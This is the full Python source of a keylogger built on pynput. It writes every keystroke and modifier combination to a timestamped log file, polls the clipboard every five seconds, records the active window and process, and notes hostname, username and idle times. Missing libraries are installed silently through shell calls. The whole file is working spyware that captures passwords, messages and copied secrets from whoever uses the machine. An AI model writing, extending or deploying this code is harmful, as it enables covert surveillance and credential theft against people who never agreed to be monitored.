from datetime import datetime, timedelta
import threading
import time
import os
import subprocess
import socket
import getpass

try:
    from pynput import keyboard
except ModuleNotFoundError:
    subprocess.check_output("pip install pynput", shell=True, stderr=subprocess.STDOUT)
    from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.__current_date_time = datetime.now().strftime("%d-%m-%Y_%I-%M-%S %p")
        self.__file_name = "logs " + self.__current_date_time + ".txt"
        self.__last_activity_time = datetime.now()
        self.__modified_logged = False
        self.__user_idle = False
        self.__last_clipboard = ""
        self.__pressed_keys = set()

        self.__MODIFIER_KEYS = {
            keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, 
            keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt, 
            keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.cmd, 
            keyboard.Key.cmd_r
        }

        self.__KEY_MAPPINGS = {
            keyboard.Key.enter: "[ENTER]\n", keyboard.Key.tab: "[TAB]\t", 
            keyboard.Key.space: "[SPACEBAR]", keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.left: "[LEFT_ARROW]", keyboard.Key.right: "[RIGHT_ARROW]", 
            keyboard.Key.up: "[UP_ARROW]", keyboard.Key.down: "[DOWN_ARROW]",
            keyboard.Key.delete: "[DELETE]", keyboard.Key.insert: "[INSERT]", 
            keyboard.Key.home: "[HOME]", keyboard.Key.end: "[END]", 
            keyboard.Key.page_up: "[PGUP]", keyboard.Key.page_down: "[PGDN]",
            keyboard.Key.caps_lock: "[CAPSLOCK]", keyboard.Key.print_screen: "[PRTSC]", 
            keyboard.Key.scroll_lock: "[SCROLLLOCK]", keyboard.Key.pause: "[PAUSE]", 
            keyboard.Key.num_lock: "[NUMLOCK]", keyboard.Key.menu: "[MENU]",
            keyboard.Key.media_volume_up: "[VOL+]", keyboard.Key.media_volume_down: "[VOL-]",
            keyboard.Key.media_volume_mute: "[MUTE]", keyboard.Key.media_play_pause: "[PLAY/PAUSE]",
            keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]", keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]", keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]", keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]", keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
            
            keyboard.Key.ctrl: "ctrl", keyboard.Key.ctrl_l: "ctrl", keyboard.Key.ctrl_r: "ctrl",
            keyboard.Key.shift: "shift", keyboard.Key.shift_r: "shift",
            keyboard.Key.alt: "alt", keyboard.Key.alt_l: "alt", keyboard.Key.alt_r: "alt",
            keyboard.Key.cmd: "cmd", keyboard.Key.cmd_r: "cmd",
        }
        
    def __SessionStarted(self):
        hostname = socket.gethostname()
        username = getpass.getuser()

        if self.__file_name:
            with open(self.__file_name, "w", encoding="utf-8") as w_file:
                w_file.write(f"[Session started at: {self.__current_date_time} on Machine: {hostname} by User: {username}] \n")

    def __ModifiedSession(self):
        if self.__file_name:
            self.__current_date_time = datetime.now().strftime("%d-%m-%Y_%I:%M:%S %p")
            
            with open(self.__file_name, "a", encoding="utf-8")as w_file:
                w_file.write(f"\n[Initial interaction: {self.__current_date_time}]\n")

    def __handleIdleTime(self):
        current_time = datetime.now()
        idle_time = current_time - self.__last_activity_time
        
        if not self.__user_idle and idle_time > timedelta(seconds=60):
            with open(self.__file_name, "a", encoding="utf-8") as w_file:
                w_file.write(f"\n[User is Idle since: {self.__last_activity_time.strftime('%d-%m-%Y_%I:%M:%S %p')}]\n")
            self.__user_idle = True

    def __checkIdleTime(self):
        def monitor():
            while True:
                self.__handleIdleTime()            
                time.sleep(5)

        idle_time_thread = threading.Thread(target=monitor, daemon=True)
        idle_time_thread.start()        
        
    def __getActiveWindow(self):
        if os.name == "nt":
            try:
                import win32gui
                import win32process
                import psutil
            except ModuleNotFoundError:
                subprocess.check_output("pip install pywin32 psutil", shell=True, stderr=subprocess.STDOUT)
                import win32gui
                import win32process
                import psutil
                
            try:
                foreground_window = win32gui.GetForegroundWindow()
                window_title = win32gui.GetWindowText(foreground_window)
                thread_id, process_id = win32process.GetWindowThreadProcessId(foreground_window)
                process_name = psutil.Process(process_id).name()
                
                if window_title:
                    return f"{window_title} ({process_name})"
                else:
                    return f"[No Active Window] ({process_name})"
        
            except Exception:
                return "[Unknown/Unreachable Window] ([Unknown Process])"
        
        elif os.name == "posix":
            try:
                output = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"],stderr=subprocess.DEVNULL)
                active_window = output.decode().strip()

            except Exception as e:
                print(f"Error: {e}")
                active_window = "[Unknown/Unreachable Window]"
                
        return active_window
    
    def __checkActiveWindow(self):
        def window_monitor():
            last_window = None
            while True:
                current_window = self.__getActiveWindow()
                if current_window and current_window != last_window and "xdotool" not in current_window:
                    with open(self.__file_name, "a", encoding="utf-8") as w_file:
                        w_file.write(f"\n\nActive Window: {current_window}\n")
                    last_window = current_window
                time.sleep(0.2)

        window_thread = threading.Thread(target=window_monitor, daemon=True)
        window_thread.start()    
        
    def __getClipboard(self):
        try:
            import pyperclip
        except ModuleNotFoundError:
            subprocess.check_output("pip install pyperclip", shell=True, stderr=subprocess.STDOUT)
            import pyperclip

        clipboard_contents = pyperclip.paste()

        return clipboard_contents
    
    def __checkClipboard(self):
        def monitor_clipboard():
            while True:
                clipboard_contents = self.__getClipboard()
                if clipboard_contents != self.__last_clipboard:
                    with open(self.__file_name, "a", encoding="utf-8") as w_file:
                        w_file.write(f"\n[Clipboard captured at: {datetime.now().strftime('%d-%m-%Y_%I:%M:%S %p')}]\n")
                        w_file.write(f"\n[Clipboard logged data:]\n{clipboard_contents}")
                self.__last_clipboard = clipboard_contents    
                time.sleep(5)

        clipoard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipoard_thread.start()

    def __OnPress(self, key):
        self.__last_activity_time = datetime.now()
        self.__pressed_keys.add(key)

        if not self.__modified_logged:
            self.__ModifiedSession()
            self.__modified_logged = True

        if self.__user_idle:
            current_time = datetime.now()
            with open(self.__file_name, "a", encoding="utf-8") as w_file:
                w_file.write(f"\n[User resumed at: {current_time.strftime('%d-%m-%Y_%I:%M:%S %p')}]\n")
            self.__user_idle = False

        if key == keyboard.Key.esc:
            return False

        modifiers = []
        for k in self.__pressed_keys:
            if k in self.__MODIFIER_KEYS:
                modifiers.append(k)
                
        if key in self.__MODIFIER_KEYS:
            return

        if modifiers:
            modifier_names = set()
            for mod_key in modifiers:
                name = self.__KEY_MAPPINGS.get(mod_key, str(mod_key)).upper()
                modifier_names.add(name)
            
            mod_str = " + ".join(sorted(list(modifier_names)))

            key_char = ""
            try:
                char = key.char
                if char and 1 <= ord(char) <= 26:
                    key_char = chr(ord(char) + 64)
                else:
                    key_char = char.upper()

            except AttributeError:
                mapped_key = self.__KEY_MAPPINGS.get(key)
                if mapped_key:
                    key_char = mapped_key.strip("[]").upper()
                else:
                    key_char = str(key).replace("Key.", "").upper()

            self.__stroke = f"[{mod_str} + {key_char}]"

        else:
            if key in self.__KEY_MAPPINGS:
                self.__stroke = self.__KEY_MAPPINGS[key]
            else:
                try:
                    self.__stroke = key.char
                except AttributeError:
                    if hasattr(key, 'vk') and 96 <= key.vk <= 105:
                        self.__stroke = str(key.vk - 96)
                    elif hasattr(key, 'vk') and key.vk == 110:
                        self.__stroke = "."
                    else:
                        self.__stroke = str(key)

        try:
            with open(self.__file_name, "a", encoding="utf-8") as file:
                file.write(str(self.__stroke))
        except Exception as e:
            print(f"Error writing to log file: {e}")
            
    def __OnRelease(self,key):
        self.__pressed_keys.discard(key)
    
    def start(self):
        with keyboard.Listener(on_press=self.__OnPress, on_release=self.__OnRelease) as listener:
            self.__SessionStarted()
            self.__checkIdleTime()
            self.__handleIdleTime()
            self.__checkActiveWindow()
            self.__checkClipboard()
            listener.join()            
                                    
if __name__ == "__main__":
    logger = Keylogger()
    logger.start()